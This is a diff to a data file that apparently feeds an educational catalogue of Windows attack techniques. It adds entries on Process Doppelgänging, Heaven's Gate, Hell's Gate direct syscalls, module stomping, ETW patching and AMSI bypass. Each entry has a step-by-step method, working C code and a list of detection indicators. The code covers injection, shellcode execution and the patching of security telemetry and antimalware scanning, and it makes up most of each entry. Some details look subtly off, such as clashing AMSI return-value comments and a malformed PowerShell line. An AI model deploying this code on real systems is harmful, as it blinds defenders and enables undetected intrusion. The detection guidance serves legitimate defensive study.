@@ -8,6 +8,8 @@ CATEGORIES = [
     "Hooking",
     "Thread Manipulation",
     "Advanced Evasion",
+    "Persistence",
+    "Credential Access",
 ]
 
 TECHNIQUES = [
@@ -1147,6 +1149,1044 @@ int main(void) {
         "sim_description": (
             "Shows a mock hooked function with the JMP patch bytes, then demonstrates "
             "the restoration process by replacing them with the original syscall stub bytes."
+        ),
+    },
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # PROCESS INJECTION (continued)
+    # ─────────────────────────────────────────────────────────────────────────
+    {
+        "id": "process_doppelganging",
+        "name": "Process Doppelgänging",
+        "category": "Process Injection",
+        "difficulty": "Expert",
+        "platform": "Windows",
+        "mitre_attack": "T1055.013",
+        "tags": ["doppelganging", "TxF", "NTFS transaction", "NtCreateProcessEx", "fileless"],
+        "short_desc": "Uses Windows Transactional NTFS to load a malicious PE that never touches the real filesystem.",
+        "description": (
+            "Process Doppelgänging, introduced by enSilo at Black Hat Europe 2017, abuses the Windows "
+            "Transactional NTFS (TxF) API to create a process from a PE that is written within a "
+            "transaction that is immediately rolled back. The malicious file is never committed to disk "
+            "— it exists only within the kernel's transaction manager memory.\n\n"
+            "The key insight: NtCreateSection(SEC_IMAGE) on a transacted file handle creates an image "
+            "section from the transacted (in-memory) version of the file. Even after the transaction is "
+            "rolled back and the on-disk file reverts to its original state, the image section — and any "
+            "process created from it — continues to use the transacted (malicious) content.\n\n"
+            "From Windows' perspective, the process image path points to a legitimate file. Forensic "
+            "analysis of the disk shows only the original file. This makes it extremely difficult for "
+            "file-based scanners to detect the malicious content."
+        ),
+        "how_it_works": [
+            "CreateTransaction() — opens a new NTFS kernel transaction object.",
+            "CreateFileTransactedA(hostPath, ..., hTransaction) — opens a legitimate executable (e.g. svchost.exe) within the transaction.",
+            "WriteFile(hTransactedFile, maliciousPE, peSize) — overwrites the file contents within the transaction only.",
+            "NtCreateSection(SEC_IMAGE, hTransactedFile) — creates a memory-mapped image section from the transacted file.",
+            "RollbackTransaction(hTransaction) — reverts the on-disk file to its original content. The section still holds the malicious image.",
+            "NtCreateProcessEx(hSection) — creates a new process backed by the malicious section.",
+            "NtCreateThreadEx at the PE entry point to start execution.",
+            "The process runs malicious code but reports a legitimate image path in Task Manager and PEB.",
+        ],
+        "code_example": r"""#include <windows.h>
+#include <winternl.h>
+#include <stdio.h>
+
+// TxF and NT API typedefs
+typedef HANDLE (WINAPI *PFN_CreateTransaction)(LPSECURITY_ATTRIBUTES, LPGUID, DWORD, DWORD, DWORD, DWORD, LPWSTR);
+typedef BOOL   (WINAPI *PFN_RollbackTransaction)(HANDLE);
+typedef NTSTATUS (NTAPI *PFN_NtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+typedef NTSTATUS (NTAPI *PFN_NtCreateProcessEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, ULONG, HANDLE, HANDLE, HANDLE, BOOLEAN);
+
+BOOL DoppelGang(const wchar_t *hostPath, PBYTE payload, SIZE_T payloadSize) {
+    // Load TxF functions dynamically
+    HMODULE hKtmW32  = LoadLibraryA("KtmW32.dll");
+    HMODULE hNtdll   = GetModuleHandleA("ntdll.dll");
+
+    PFN_CreateTransaction    pCreateTx    = (PFN_CreateTransaction)GetProcAddress(hKtmW32, "CreateTransaction");
+    PFN_RollbackTransaction  pRollback    = (PFN_RollbackTransaction)GetProcAddress(hKtmW32, "RollbackTransaction");
+    PFN_NtCreateSection      pNtCreateSec = (PFN_NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
+    PFN_NtCreateProcessEx    pNtCreatePro = (PFN_NtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
+
+    // 1. Open a new NTFS transaction
+    HANDLE hTx = pCreateTx(NULL, NULL, 0, 0, 0, 0, NULL);
+    printf("[+] Transaction handle: %p\n", hTx);
+
+    // 2. Open host file within the transaction
+    HANDLE hFile = CreateFileTransactedW(
+        hostPath, GENERIC_WRITE | GENERIC_READ,
+        0, NULL, OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL, NULL,
+        hTx, NULL, NULL);
+    printf("[+] Transacted file: %p\n", hFile);
+
+    // 3. Overwrite with malicious PE (visible only within transaction)
+    DWORD written;
+    WriteFile(hFile, payload, (DWORD)payloadSize, &written, NULL);
+    printf("[+] Wrote %lu bytes to transacted file\n", written);
+
+    // 4. Create image section from transacted file
+    HANDLE hSection = NULL;
+    NTSTATUS status = pNtCreateSec(
+        &hSection,
+        SECTION_ALL_ACCESS,
+        NULL, NULL,
+        PAGE_READONLY,
+        SEC_IMAGE,    // map as executable image
+        hFile);
+    printf("[+] Section: %p  (NTSTATUS=0x%08X)\n", hSection, status);
+    CloseHandle(hFile);
+
+    // 5. Roll back — disk file reverts to original; section keeps malicious image
+    pRollback(hTx);
+    CloseHandle(hTx);
+    printf("[*] Transaction rolled back — disk is clean\n");
+
+    // 6. Create process from the (now-malicious) section
+    HANDLE hProc = NULL;
+    pNtCreatePro(&hProc, PROCESS_ALL_ACCESS, NULL,
+                  GetCurrentProcess(), 0,
+                  hSection, NULL, NULL, FALSE);
+    printf("[+] Process created: %p\n", hProc);
+
+    // 7. Create main thread at PE entry point (omitted for brevity — same as hollowing)
+    // NtCreateThreadEx, set up PEB, etc.
+
+    CloseHandle(hSection);
+    return TRUE;
+}
+""",
+        "code_language": "c",
+        "detection": [
+            "CreateFileTransactedW + WriteFile + NtCreateSection(SEC_IMAGE) + RollbackTransaction sequence.",
+            "NtCreateProcessEx called with a section not backed by any visible on-disk file.",
+            "Process image path pointing to a legitimate file whose content hash doesn't match the running code.",
+            "Memory forensics: scan mapped sections for PE images whose on-disk hash differs from the running image.",
+            "Windows 10 1803+ partially mitigates by blocking transacted section-image creation (KB4093119).",
+            "ETW: kernel transaction events combined with process-create events from non-standard callers.",
+        ],
+        "has_simulation": True,
+        "sim_description": (
+            "Step-by-step walkthrough: transaction lifecycle, transacted write, section creation, "
+            "rollback, and process creation — with a side-by-side showing what's on disk vs. in memory."
+        ),
+    },
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # ADVANCED EVASION (continued)
+    # ─────────────────────────────────────────────────────────────────────────
+    {
+        "id": "heavens_gate",
+        "name": "Heaven's Gate (WOW64 Escape)",
+        "category": "Advanced Evasion",
+        "difficulty": "Expert",
+        "platform": "Windows",
+        "mitre_attack": "T1055.012",
+        "tags": ["Heaven's Gate", "WOW64", "64-bit", "segment selector", "far jmp", "hook bypass"],
+        "short_desc": "A 32-bit process jumps to 64-bit execution mode to bypass 32-bit user-mode hooks.",
+        "description": (
+            "On 64-bit Windows, 32-bit processes run under WOW64 (Windows-on-Windows 64). EDRs hook "
+            "the 32-bit ntdll.dll to monitor API calls from 32-bit code. Heaven's Gate exploits a "
+            "fundamental CPU feature: on x64 processors, code can switch between 32-bit (compatibility) "
+            "and 64-bit (long) mode using a far JMP with a specific segment selector.\n\n"
+            "Segment selector 0x23 = 32-bit compatibility mode. Selector 0x33 = 64-bit long mode. "
+            "A 32-bit process can execute a far JMP to CS:0x33 to transition to 64-bit mode, directly "
+            "call 64-bit NTDLL syscall stubs (which are NOT hooked by 32-bit EDR hooks), then jump back "
+            "to 0x23 to return to 32-bit mode.\n\n"
+            "This completely bypasses all 32-bit user-mode hooks because the call never passes through "
+            "the hooked 32-bit ntdll. The 64-bit ntdll stubs are unhooked from the perspective of the "
+            "32-bit EDR component."
+        ),
+        "how_it_works": [
+            "Confirm you're in a WOW64 process: IsWow64Process() returns TRUE.",
+            "Locate the 64-bit NTDLL base: read the 64-bit TEB at FS:[0xC0] (WOW64 stores it there), walk PEB64.Ldr.",
+            "Find the target syscall function (e.g. NtAllocateVirtualMemory) in the 64-bit NTDLL export table.",
+            "Extract the Syscall Service Number (SSN) from the stub's MOV EAX, <ssn> instruction.",
+            "Prepare arguments in 64-bit calling convention: RCX, RDX, R8, R9, then stack.",
+            "In inline assembly: push the 64-bit return address, then execute a far JMP with selector 0x33.",
+            "CPU switches to 64-bit mode — now execute the syscall instruction with the SSN in EAX.",
+            "Far JMP back to selector 0x23 to return to 32-bit mode.",
+            "The kernel handled the syscall directly — 32-bit hooks were never invoked.",
+        ],
+        "code_example": r"""// Heaven's Gate — 32-bit code calling a 64-bit syscall
+// Compile as 32-bit (x86) on a 64-bit Windows system
+
+#include <windows.h>
+#include <stdio.h>
+
+// The 64-bit syscall stub we'll execute directly
+// NtAllocateVirtualMemory SSN on Windows 10 21H2 = 0x18
+#define NT_ALLOC_SSN  0x18
+
+// Far pointer structure for the jmp
+#pragma pack(push, 1)
+typedef struct { DWORD offset; WORD selector; } FAR_JMP_PTR;
+#pragma pack(pop)
+
+// Switch to 64-bit mode and execute syscall
+__declspec(naked) NTSTATUS NTAPI X64Syscall(
+    DWORD ssn,        // syscall number
+    DWORD argCount,   // number of arguments
+    ...               // arguments
+) {
+    __asm {
+        // Save registers
+        push ebp
+        mov  ebp, esp
+        push edi
+        push esi
+        push ebx
+
+        // Build the far JMP descriptor (Heaven's Gate)
+        call next
+    next:
+        pop  esi
+        lea  edi, [esi + (gate64 - next)]   ; 64-bit code address
+        mov  word  ptr [esi + 5], 0x33      ; selector = 0x33 (64-bit)
+
+        // Prepare arguments for 64-bit calling convention
+        // (simplified — real impl marshals args onto 64-bit stack)
+        mov  eax, [ebp + 8]   ; SSN
+
+        // Far JMP to 64-bit mode
+        jmp  fword ptr [edi]
+
+    gate64:
+        // ── NOW IN 64-BIT MODE ────────────────────────────────────────
+        // (assembler won't encode these natively in MASM 32-bit mode
+        //  — in practice use raw byte sequences)
+        // mov r10, rcx
+        DB 0x4C, 0x8B, 0xD1       ; mov r10, rcx
+        DB 0x0F, 0x05              ; syscall
+        // Return via far jmp back to 0x23
+        DB 0xCB                    ; retf  (returns to 32-bit mode)
+
+        // ── BACK IN 32-BIT MODE ────────────────────────────────────────
+        pop  ebx
+        pop  esi
+        pop  edi
+        pop  ebp
+        ret  8
+    }
+}
+
+int main(void) {
+    PVOID base = NULL;
+    SIZE_T size = 0x1000;
+
+    // Call NtAllocateVirtualMemory directly through Heaven's Gate
+    NTSTATUS st = X64Syscall(
+        NT_ALLOC_SSN, 6,
+        GetCurrentProcess(), &base, 0, &size,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
+    );
+
+    printf("[+] X64Syscall → NTSTATUS=0x%08X  base=%p\n", st, base);
+    return 0;
+}
+""",
+        "code_language": "c",
+        "detection": [
+            "Far JMP instructions with selector 0x33 in 32-bit process code are a direct Heaven's Gate signature.",
+            "Execution of 64-bit code (detected by segment change) within a WOW64 process outside of wow64.dll.",
+            "Syscall events arriving from a 32-bit process address range — kernel can detect the calling context.",
+            "64-bit EDR components can monitor syscall counts and patterns from WOW64 processes.",
+            "Binary signatures: byte patterns 0x33 (selector), 0x0F 0x05 (syscall) in 32-bit PE sections.",
+        ],
+        "has_simulation": True,
+        "sim_description": (
+            "Animated walkthrough: WOW64 process layout, 32-bit hook chain, far JMP to 0x33, "
+            "64-bit syscall execution, and return — showing why 32-bit hooks are completely bypassed."
+        ),
+    },
+
+    {
+        "id": "direct_syscalls",
+        "name": "Direct Syscalls / Hell's Gate",
+        "category": "Advanced Evasion",
+        "difficulty": "Expert",
+        "platform": "Windows",
+        "mitre_attack": "T1562.001",
+        "tags": ["syscall", "SSN", "Hell's Gate", "SysWhispers", "direct syscall", "EDR bypass"],
+        "short_desc": "Invokes Windows kernel functions directly via the syscall instruction, bypassing all NTDLL user-mode hooks.",
+        "description": (
+            "EDR hooks live in ntdll.dll's user-mode stubs. Direct syscalls skip ntdll entirely: "
+            "the attacker manually replicates the 2–4 instruction syscall stub (mov r10,rcx / mov eax,SSN / syscall) "
+            "in their own code, calling the kernel directly.\n\n"
+            "The critical challenge is knowing the Syscall Service Number (SSN) — an integer that "
+            "maps to each kernel function. SSNs change between Windows versions and patch levels. "
+            "Tools like SysWhispers2/3 solve this at compile time by embedding version-specific SSN tables.\n\n"
+            "Hell's Gate (by am0nsec & RtlMateusz) goes further: it dynamically resolves SSNs at runtime by "
+            "scanning the in-memory ntdll for syscall stubs. Even if hooks are present, Hell's Gate "
+            "detects the JMP patch and scans nearby functions to deduce the correct SSN — making it "
+            "resilient to both static and dynamic analysis."
+        ),
+        "how_it_works": [
+            "Locate ntdll.dll base address via PEB.Ldr (no GetModuleHandle — avoids API hooks).",
+            "Walk ntdll's export table to find the target function (e.g. NtAllocateVirtualMemory).",
+            "Read the first bytes of the stub: look for 'MOV EAX, <imm32>' — that immediate is the SSN.",
+            "Hell's Gate: if the first byte is 0xE9 (JMP — EDR hook), scan neighbouring functions to infer the SSN by ordinal offset.",
+            "Embed a syscall stub in your own code: mov r10,rcx / mov eax,<SSN> / syscall / ret.",
+            "Call your stub with the same arguments as the NTDLL function.",
+            "The CPU transitions to ring 0 directly — ntdll stubs (and their hooks) are never touched.",
+        ],
+        "code_example": r"""// Direct syscall example — NtAllocateVirtualMemory without touching ntdll
+// SSN extracted at runtime using Hell's Gate technique
+
+#include <windows.h>
+#include <stdio.h>
+
+typedef struct { WORD count; WORD limit; DWORD base; } DESCRIPTOR;
+
+// ── SSN resolution (Hell's Gate) ────────────────────────────────────────────
+DWORD GetSSN(const char *funcName) {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    PBYTE   fn     = (PBYTE)GetProcAddress(hNtdll, funcName);
+
+    // Check for EDR hook (JMP patch)
+    if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 &&
+        fn[3] == 0xB8) {
+        // Clean stub: MOV R10,RCX / MOV EAX,<SSN>
+        return *(DWORD *)(fn + 4);
+    }
+
+    if (fn[0] == 0xE9) {
+        // JMP hook — scan down to find a clean neighbour
+        // (neighbours have consecutive SSNs, so SSN = neighbourSSN ± offset)
+        for (int i = 1; i < 500; i++) {
+            PBYTE candidate = fn + (i * 32);  // approx stub spacing
+            if (candidate[0] == 0x4C && candidate[3] == 0xB8)
+                return *(DWORD *)(candidate + 4) - i;
+        }
+    }
+    return 0;
+}
+
+// ── Inline syscall stub ──────────────────────────────────────────────────────
+// At runtime, patch <SSN> into the MOV EAX instruction
+NTSTATUS DoSyscall(DWORD ssn, HANDLE hProc, PVOID *base,
+                   ULONG_PTR zeroBits, PSIZE_T regionSize,
+                   ULONG allocType, ULONG protect) {
+    NTSTATUS ret;
+    __asm__ volatile (
+        "mov r10, rcx\n\t"      // per Windows x64 calling convention
+        "mov eax, %1\n\t"       // SSN
+        "syscall\n\t"
+        "mov %0, eax"
+        : "=r"(ret)
+        : "r"(ssn),
+          "c"(hProc), "d"(base)  // RCX, RDX — other args on stack
+        : "r10", "r8", "r9", "memory"
+    );
+    return ret;
+}
+
+int main(void) {
+    DWORD ssn  = GetSSN("NtAllocateVirtualMemory");
+    printf("[+] NtAllocateVirtualMemory SSN = 0x%02X\n", ssn);
+
+    PVOID  base = NULL;
+    SIZE_T sz   = 0x1000;
+
+    NTSTATUS st = DoSyscall(ssn, GetCurrentProcess(), &base, 0, &sz,
+                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    printf("[+] Allocated @ %p  NTSTATUS=0x%08X\n", base, st);
+    VirtualFree(base, 0, MEM_RELEASE);
+    return 0;
+}
+""",
+        "code_language": "c",
+        "detection": [
+            "Syscall instruction (0F 05) executed from memory outside ntdll.dll is a strong EDR signal.",
+            "Stack traces showing syscall returns to non-ntdll addresses (kernel uses the return address for auditing).",
+            "Kernel ETW: system call events where the calling address doesn't match known ntdll stub ranges.",
+            "Static analysis: scan PE files for syscall byte patterns (4C 8B D1 B8 ?? ?? ?? ?? 0F 05) outside ntdll.",
+            "Heuristic: processes that never call ntdll stubs but perform privileged operations are anomalous.",
+            "SysWhispers artifacts: presence of SSN tables or characteristic stub sequences in code sections.",
+        ],
+        "has_simulation": True,
+        "sim_description": (
+            "Demonstrates Hell's Gate SSN resolution: scans mock ntdll stubs, detects a hooked function, "
+            "and infers the correct SSN from a clean neighbouring stub."
+        ),
+    },
+
+    {
+        "id": "module_stomping",
+        "name": "Module Stomping",
+        "category": "Advanced Evasion",
+        "difficulty": "Expert",
+        "platform": "Windows",
+        "mitre_attack": "T1055.001",
+        "tags": ["module stomping", "overwrite", "legitimate module", "memory evasion", "file-backed"],
+        "short_desc": "Loads a legitimate DLL then overwrites its .text section with shellcode, making malicious memory appear file-backed.",
+        "description": (
+            "Security tools often distinguish between 'legitimate' and 'suspicious' memory by checking "
+            "whether a memory region is backed by a file on disk. Anonymous (private) memory containing "
+            "executable code is treated as suspicious; file-backed memory (loaded from a DLL on disk) is "
+            "typically trusted.\n\n"
+            "Module Stomping exploits this assumption. The attacker loads a legitimate but rarely-used "
+            "DLL (e.g. clrjit.dll, wbemprox.dll) into the target process, then overwrites its .text "
+            "section with shellcode. The memory still appears to be backed by the legitimate DLL file — "
+            "the VAD (Virtual Address Descriptor) entry shows the correct file path.\n\n"
+            "This defeats file-backed memory checks and makes the shellcode blend in with legitimate "
+            "module memory. Combined with stomping a DLL that's already expected to be loaded "
+            "(Module Overloading), this becomes even stealthier."
+        ),
+        "how_it_works": [
+            "Choose a target DLL — one that's legitimate, large enough for your shellcode, and not commonly profiled.",
+            "LoadLibraryEx(dllPath, NULL, DONT_RESOLVE_DLL_REFERENCES) loads the DLL without running DllMain or resolving imports.",
+            "Parse the loaded DLL's PE headers to find the .text section VirtualAddress and size.",
+            "VirtualProtect the .text section to PAGE_EXECUTE_READWRITE.",
+            "Overwrite the beginning of .text with your shellcode bytes.",
+            "Restore page protection to PAGE_EXECUTE_READ to avoid the RWX anomaly.",
+            "Execute the shellcode by jumping to the stomped .text base address.",
+            "The shellcode runs in memory that appears to be the legitimate DLL — VAD shows the DLL path.",
+        ],
+        "code_example": r"""#include <windows.h>
+#include <stdio.h>
+
+// Shellcode placeholder (replace with payload)
+unsigned char sc[] = { 0x90, 0x90, 0x90, 0xC3 };  // NOP NOP NOP RET
+
+BOOL StompModule(const wchar_t *dllPath, PBYTE sc, SIZE_T scLen) {
+    // 1. Load DLL without running DllMain (avoids detection from DllMain hooks)
+    HMODULE hMod = LoadLibraryExW(dllPath, NULL,
+                                    DONT_RESOLVE_DLL_REFERENCES);
+    if (!hMod) {
+        printf("[-] LoadLibraryEx failed: %lu\n", GetLastError());
+        return FALSE;
+    }
+    printf("[+] Loaded %ls @ %p\n", dllPath, hMod);
+
+    // 2. Parse PE to find .text section
+    PBYTE base = (PBYTE)hMod;
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+
+    PBYTE  textAddr = NULL;
+    SIZE_T textSize = 0;
+
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
+        if (memcmp(sec->Name, ".text", 5) == 0) {
+            textAddr = base + sec->VirtualAddress;
+            textSize = sec->Misc.VirtualSize;
+            break;
+        }
+    }
+
+    if (!textAddr || scLen > textSize) {
+        printf("[-] .text section not found or too small\n");
+        return FALSE;
+    }
+    printf("[+] .text @ %p  size=0x%zX\n", textAddr, textSize);
+
+    // 3. Make .text writable
+    DWORD oldProt;
+    VirtualProtect(textAddr, scLen, PAGE_EXECUTE_READWRITE, &oldProt);
+
+    // 4. Overwrite with shellcode
+    memcpy(textAddr, sc, scLen);
+    printf("[+] Shellcode written to .text section of %ls\n", dllPath);
+
+    // 5. Restore to RX (remove the RWX anomaly)
+    VirtualProtect(textAddr, scLen, PAGE_EXECUTE_READ, &oldProt);
+
+    // 6. Execute — memory appears to be legitimate DLL code
+    printf("[*] Executing shellcode at %p (looks like %ls)\n", textAddr, dllPath);
+    ((void(*)())textAddr)();
+
+    return TRUE;
+}
+
+int main(void) {
+    // clrjit.dll is large, rarely monitored, and infrequently loaded
+    return StompModule(L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clrjit.dll",
+                        sc, sizeof(sc)) ? 0 : 1;
+}
+""",
+        "code_language": "c",
+        "detection": [
+            "VirtualProtect on a loaded module's .text section from outside the loader is anomalous.",
+            "Compare in-memory module content against the on-disk file — hash mismatches flag stomped modules.",
+            "pe-sieve / Moneta: scan all loaded modules for .text content that doesn't match the disk image.",
+            "LoadLibraryEx with DONT_RESOLVE_DLL_REFERENCES for unusual DLLs (clrjit, wbemprox) is suspicious.",
+            "Thread start address pointing into a legitimate DLL's .text but far from any known export entry point.",
+            "Module load events for DLLs that are unexpected for the process type (no reason for clrjit in notepad).",
+        ],
+        "has_simulation": True,
+        "sim_description": (
+            "Step-by-step: DLL load, .text section discovery, permission change, overwrite, "
+            "and execution — with a memory map showing how the stomped region appears legitimate."
+        ),
+    },
+
+    {
+        "id": "etw_patching",
+        "name": "ETW Patching",
+        "category": "Advanced Evasion",
+        "difficulty": "Intermediate",
+        "platform": "Windows",
+        "mitre_attack": "T1562.006",
+        "tags": ["ETW", "patch", "telemetry", "blind", "EtwEventWrite", "logging bypass"],
+        "short_desc": "Patches EtwEventWrite in ntdll to silence all ETW-based security telemetry from the current process.",
+        "description": (
+            "Event Tracing for Windows (ETW) is the primary telemetry backbone for Windows Defender, "
+            "many EDR products, and security auditing. Providers (including the kernel and ntdll itself) "
+            "emit structured events via EtwEventWrite in ntdll.dll. If this function is patched to "
+            "return immediately, no events reach any ETW consumer — including security products.\n\n"
+            "The patch is trivially simple: write a RET (0xC3) as the first byte of EtwEventWrite. "
+            "All calls to this function become instant no-ops, effectively blinding any ETW-based "
+            "detection for the lifetime of the process.\n\n"
+            "A more surgical variant patches specific provider GUIDs or targets only Microsoft-Windows-"
+            "Threat-Intelligence events (used by PPL-protected processes). Since ETW also underlies "
+            ".NET's logging, AMSI's script-content logging, and PowerShell's ScriptBlock logging, "
+            "this single patch can disable multiple security layers at once."
+        ),
+        "how_it_works": [
+            "Get the address of EtwEventWrite: GetProcAddress(GetModuleHandleA('ntdll.dll'), 'EtwEventWrite').",
+            "VirtualProtect the page containing EtwEventWrite to PAGE_EXECUTE_READWRITE.",
+            "Write 0xC3 (RET instruction) to the first byte, optionally preceded by XOR EAX,EAX (return S_OK).",
+            "Restore the original page protection with VirtualProtect.",
+            "From this point on, all ETW events from this process are silently dropped.",
+            "Optionally patch EtwEventWriteFull and NtTraceEvent for more complete coverage.",
+        ],
+        "code_example": r"""#include <windows.h>
+#include <stdio.h>
+
+BOOL PatchETW(void) {
+    HMODULE ntdll     = GetModuleHandleA("ntdll.dll");
+    PBYTE   etwWrite  = (PBYTE)GetProcAddress(ntdll, "EtwEventWrite");
+
+    if (!etwWrite) {
+        printf("[-] EtwEventWrite not found\n");
+        return FALSE;
+    }
+    printf("[*] EtwEventWrite @ %p  first bytes: %02X %02X %02X\n",
+           etwWrite, etwWrite[0], etwWrite[1], etwWrite[2]);
+
+    // 1. Make the page writable
+    DWORD oldProt;
+    if (!VirtualProtect(etwWrite, 1, PAGE_EXECUTE_READWRITE, &oldProt)) {
+        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    // 2. Patch: write RET (0xC3) as first instruction
+    //    Optionally: XOR EAX,EAX (31 C0) + RET (C3) = returns STATUS_SUCCESS
+    etwWrite[0] = 0xC3;
+
+    // 3. Restore protection
+    VirtualProtect(etwWrite, 1, oldProt, &oldProt);
+
+    printf("[+] EtwEventWrite patched → 0xC3 (RET)\n");
+    printf("[*] All ETW events from this process are now silenced\n");
+    return TRUE;
+}
+
+BOOL PatchScriptBlockLogging(void) {
+    // PowerShell / .NET ScriptBlock logging also goes through ETW
+    // Patching EtwEventWrite covers this automatically.
+    // For extra coverage, also patch NtTraceEvent:
+    HMODULE ntdll      = GetModuleHandleA("ntdll.dll");
+    PBYTE   ntTrace    = (PBYTE)GetProcAddress(ntdll, "NtTraceEvent");
+    DWORD   oldProt;
+
+    VirtualProtect(ntTrace, 1, PAGE_EXECUTE_READWRITE, &oldProt);
+    ntTrace[0] = 0xC3;
+    VirtualProtect(ntTrace, 1, oldProt, &oldProt);
+
+    printf("[+] NtTraceEvent patched\n");
+    return TRUE;
+}
+
+int main(void) {
+    PatchETW();
+    PatchScriptBlockLogging();
+    printf("[*] ETW blinded. Running payload...\n");
+    // ... payload here — no telemetry will be logged
+    return 0;
+}
+""",
+        "code_language": "c",
+        "detection": [
+            "VirtualProtect on ntdll.dll's EtwEventWrite function is a near-certain indicator.",
+            "Byte-level integrity checks: monitor the first bytes of EtwEventWrite for modification.",
+            "Kernel ETW (via kernel provider) can detect user-mode ETW patching — some EDRs use kernel providers as fallback.",
+            "Absence of expected ETW events from a process that should be generating them (behavioral gap).",
+            "Hardware breakpoints / VMI-based monitoring can detect writes to ntdll code sections.",
+            "ETW-TI (Threat Intelligence) provider in the kernel is unaffected by user-mode ETW patches.",
+        ],
+        "has_simulation": True,
+        "sim_description": (
+            "Shows the EtwEventWrite function before and after patching — "
+            "comparing the original stub bytes with the patched RET, and tracing what happens to an ETW event."
+        ),
+    },
+
+    {
+        "id": "amsi_bypass",
+        "name": "AMSI Bypass (AmsiScanBuffer Patch)",
+        "category": "Advanced Evasion",
+        "difficulty": "Intermediate",
+        "platform": "Windows",
+        "mitre_attack": "T1562.001",
+        "tags": ["AMSI", "bypass", "AmsiScanBuffer", "patch", "PowerShell", "antimalware"],
+        "short_desc": "Patches AmsiScanBuffer in amsi.dll to always return AMSI_RESULT_CLEAN, bypassing script content scanning.",
+        "description": (
+            "The Antimalware Scan Interface (AMSI) is a Windows API that allows applications to pass "
+            "content to any registered antimalware product for scanning before execution. PowerShell, "
+            "VBScript, JScript, .NET, and WMI all call AMSI before running dynamic content.\n\n"
+            "The core scanning function is AmsiScanBuffer in amsi.dll. Patching it to immediately "
+            "return AMSI_RESULT_CLEAN (value 1) causes all security products' AMSI providers to report "
+            "every scan as clean — allowing arbitrary malicious scripts, shellcode, or .NET assemblies "
+            "to execute without detection.\n\n"
+            "This is one of the most widely used techniques in PowerShell-based attacks. The patch is "
+            "just 6 bytes and can be applied from within PowerShell itself, from .NET reflection, or "
+            "from a native loader. Modern variants obfuscate the patch to defeat static signature detection."
+        ),
+        "how_it_works": [
+            "Load amsi.dll: it's already loaded in PowerShell and any host using AMSI.",
+            "Resolve AmsiScanBuffer: GetProcAddress(GetModuleHandleA('amsi.dll'), 'AmsiScanBuffer').",
+            "VirtualProtect the function page to PAGE_EXECUTE_READWRITE.",
+            "Overwrite the first bytes with: MOV EAX, 0x80070057 (E_INVALIDARG) + RET, or XOR EAX,EAX / RET (returns AMSI_RESULT_CLEAN).",
+            "Restore page protection.",
+            "All subsequent AMSI scans in this process return clean — Defender and other AV providers are bypassed.",
+        ],
+        "code_example": r"""#include <windows.h>
+#include <stdio.h>
+
+// AMSI result codes
+#define AMSI_RESULT_CLEAN          1
+#define AMSI_RESULT_NOT_DETECTED   1
+
+BOOL BypassAMSI(void) {
+    HMODULE amsi = GetModuleHandleA("amsi.dll");
+    if (!amsi) {
+        // amsi.dll not loaded yet — load it
+        amsi = LoadLibraryA("amsi.dll");
+    }
+    if (!amsi) { printf("[-] amsi.dll not found\n"); return FALSE; }
+
+    PBYTE scanBuf = (PBYTE)GetProcAddress(amsi, "AmsiScanBuffer");
+    if (!scanBuf) { printf("[-] AmsiScanBuffer not found\n"); return FALSE; }
+
+    printf("[*] AmsiScanBuffer @ %p\n", scanBuf);
+    printf("[*] Original bytes: %02X %02X %02X %02X %02X %02X\n",
+           scanBuf[0], scanBuf[1], scanBuf[2],
+           scanBuf[3], scanBuf[4], scanBuf[5]);
+
+    DWORD oldProt;
+    VirtualProtect(scanBuf, 6, PAGE_EXECUTE_READWRITE, &oldProt);
+
+    // Patch option A: return E_INVALIDARG immediately
+    // MOV EAX, 0x80070057 (B8 57 00 07 80) + RET (C3)
+    BYTE patchA[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+
+    // Patch option B: XOR EAX,EAX (31 C0) + RET (C3) → returns 0 (AMSI_RESULT_CLEAN)
+    // BYTE patchB[] = { 0x31, 0xC0, 0xC3 };
+
+    memcpy(scanBuf, patchA, sizeof(patchA));
+    VirtualProtect(scanBuf, 6, oldProt, &oldProt);
+
+    printf("[+] AmsiScanBuffer patched → always returns E_INVALIDARG\n");
+    printf("[+] All AMSI scans in this process now return CLEAN\n");
+    return TRUE;
+}
+
+// ── PowerShell equivalent (for reference) ────────────────────────────────────
+// The same patch can be applied from PowerShell via reflection:
+//
+//   $a=[Ref].Assembly.GetTypes() | ForEach-Object {
+//     if ($_.Name -like "*iUtils") { $_ }
+//   }
+//   $b=$a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like "*Context" }
+//   $c=$b.GetValue($null)
+//   [IntPtr]$ptr=$c
+//   $buf=[System.Runtime.InteropServices.Marshal]::ReadByte($ptr)
+//   [System.Runtime.InteropServices.Marshal]::WriteByte($ptr, 0xeb, 0x06)
+
+int main(void) {
+    return BypassAMSI() ? 0 : 1;
+}
+""",
+        "code_language": "c",
+        "detection": [
+            "VirtualProtect on amsi.dll AmsiScanBuffer function — monitored by all major EDRs.",
+            "Byte-level integrity: monitor first bytes of AmsiScanBuffer for modification (0xB8, 0x31 0xC0, etc.).",
+            "AMSI provider events: if scan calls stop producing results for a process, it may be patched.",
+            "PowerShell ScriptBlock logging (before AMSI runs) can catch obfuscated bypass attempts.",
+            "ETW Microsoft-Antimalware-Scan-Interface provider: missing scan events from a host that normally scans.",
+            "Constrained Language Mode in PowerShell prevents reflection-based bypasses.",
+        ],
+        "has_simulation": True,
+        "sim_description": (
